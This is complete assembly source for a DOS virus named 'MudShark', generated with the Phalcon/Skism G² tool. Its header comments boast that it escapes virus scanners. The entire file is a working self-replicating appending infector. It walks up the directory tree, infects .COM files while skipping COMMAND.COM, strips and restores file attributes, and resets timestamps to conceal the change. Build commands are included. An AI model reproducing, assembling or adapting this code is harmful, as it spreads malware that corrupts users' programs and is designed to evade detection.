﻿

; Virus generated by Gý 0.70á
; Gý written by Dark Angel of Phalcon/Skism
; ************************************************************************                
; I really didn't want to release this, but since the encryption scheme we
; talked about over the phone really works here is a new virus I made to,
; demonstrate. This is a PS G2 undetectable virus  all by itself. I ran               
; the encryption to show you that it can be exicutable AND undectable.               
; Just guessing there is a 2 out of 15 chance that any scanner will pick       
; up on the future PS G2 infected files, but you can't have everything <g>.
;**************************************************************************
; MudShark By Pentagrame.... Pentagrame sez greets to  708/312!
        .model  tiny
        .code   
                
; Assemble with:
; TASM /m3 filename.ASM
; TLINK /t filename.OBJ
        org     0100h
                
carrier:
        db      0E9h,0,0                ; jmp start
                
start:
        call    next
next:
        pop     bp
        sub     bp, offset next
                
        lea     si, [bp+offset origdir+1]
        mov     ah, 0047h               ; Get directory
        cwd                             ; Default drive
        int     0021h
                
        mov     ah, 001Ah               ; Set DTA
        lea     dx, [bp+offset newDTA]
        int     0021h
                
restore_COM:
        mov     di, 0100h
        push    di
        lea     si, [bp+offset old3]
        movsw   
        movsb   
                
        mov     byte ptr [bp+numinfect], 0000h
traverse_loop:
        lea     dx, [bp+offset COMmask]
        call    infect
        cmp     [bp+numinfect], 00DDh
        jae     exit_traverse           ; exit if enough infected
                
        mov     ah, 003Bh               ; CHDIR
        lea     dx, [bp+offset dot_dot] ; go to previous dir
        int     0021h
        jnc     traverse_loop           ; loop if no error
                
exit_traverse:
                
        lea     si, [bp+offset origdir]
        mov     byte ptr [si], '\'
        xchg    dx, si
        mov     ah, 003Bh               ; restore directory
        int     0021h
                
                
        mov     dx, 0080h               ; in the PSP
        mov     ah, 001Ah               ; restore DTA to default
        int     0021h
                
return:
        ret     
                
old3            db      0cdh,20h,0
                
infect:
        mov     ah, 004Eh               ; find first
        mov     cx, 0007h               ; all files
findfirstnext:
        int     0021h
        jc      return
                
        cmp     word ptr [bp+newDTA+33], 'AM' ; Check if COMMAND.COM
        mov     ah, 004Fh               ; Set up find next
        jz      findfirstnext           ; Exit if so
                
        lea     dx, [bp+newDTA+30]
        mov     ax, 4300h
        int     0021h
        jc      return
        push    cx
        push    dx
                
        mov     ax, 4301h               ; clear file attributes
        push    ax                      ; save for later use
        xor     cx, cx
        int     0021h
                
        mov     ax, 3D02h
        lea     dx, [bp+newDTA+30]
        int     0021h
        xchg    ax, bx
                
        mov     ax, 5700h               ; get file time/date
        int     0021h
        push    cx
        push    dx
                
        lea     dx, [bp+offset readbuffer]
        mov     cx, 001Ah
        mov     ah, 003Fh
        int     0021h
                
        mov     ax, 4202h
        xor     dx, dx
        xor     cx, cx
        int     0021h
                
        cmp     word ptr [bp+offset readbuffer], 'ZM'
        jz      jmp_close
        mov     cx, word ptr [bp+offset readbuffer+1] ; jmp location
        add     cx, heap-start+3        ; convert to filesize
        cmp     ax, cx                  ; equal if already infected
        jl      skipp
jmp_close:
        jmp     close
skipp:
                
        cmp     ax, 4292h            ; check if too large
        ja      jmp_close               ; Exit if so
                
        cmp     ax, 025Ah            ; check if too small
        jb      jmp_close               ; Exit if so
                
        lea     di, [bp+offset old3]
        lea     si, [bp+offset readbuffer]
        movsw   
        movsb   
                
        sub     ax, 0003h
        mov     word ptr [bp+offset readbuffer+1], ax
        mov     dl, 00E9h
        mov     byte ptr [bp+offset readbuffer], dl
        lea     dx, [bp+offset start]
        mov     cx, heap-start
        mov     ah, 0040h               ; concatenate virus
        int     0021h
                
        xor     cx, cx
        mov     ax, 4200h
        cwd     
        int     0021h
                
                
        mov     cx, 0003h
        lea     dx, [bp+offset readbuffer]
        mov     ah, 0040h
        int     0021h
                
        inc     [bp+numinfect]
                
close:
        mov     ax, 5701h               ; restore file time/date
        pop     dx
        pop     cx
        int     0021h
                
        mov     ah, 003Eh
        int     0021h
                
        pop     ax                      ; restore file attributes
        pop     dx                      ; get filename and
        pop     cx                      ; attributes from stack
        int     0021h
                
        mov     ah, 004Fh               ; find next
        jmp     findfirstnext
                
signature       db      '[PS/Gý]',0     ; Phalcon/Skism Gý
creator         db      'pentagrame',0
virusname       db      'mudshark',0
COMmask         db      '*.COM',0
dot_dot         db      '..',0
                
heap:
newDTA          db      43 dup (?)
origdir         db      65 dup (?)
numinfect       db      ?
readbuffer      db      1ah dup (?)
endheap:
        end     carrier

</g>